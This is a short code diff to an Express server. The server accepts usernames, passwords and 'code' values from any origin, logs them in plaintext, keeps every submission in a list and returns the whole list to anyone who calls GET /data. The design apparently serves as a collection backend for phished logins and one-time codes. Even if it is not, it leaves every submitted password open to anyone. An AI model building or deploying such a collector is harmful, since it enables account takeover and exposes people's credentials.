@@ -11,18 +11,18 @@ app.use(cors({
 }));
 app.use(express.json());
 
-let latestData = {
-    username: null,
-    password: null,
-    code: null
-};
+let dataList = [];
 
 app.post("/data", (req, res) => {
-    latestData.username = req.body.username;
-    latestData.password = req.body.password;
-    latestData.code = req.body.code;
+    const newData = {
+        username: req.body.username,
+        password: req.body.password,
+        code: req.body.code
+    };
 
-    console.log("Received:", latestData);
+    dataList.push(newData);
+
+    console.log("Received:", newData);
 
     res.json({
         success: true
@@ -30,7 +30,7 @@ app.post("/data", (req, res) => {
 });
 
 app.get("/data", (req, res) => {
-    res.json(latestData);
+    res.json(dataList);
 });
 
 const PORT = process.env.PORT || 1000;
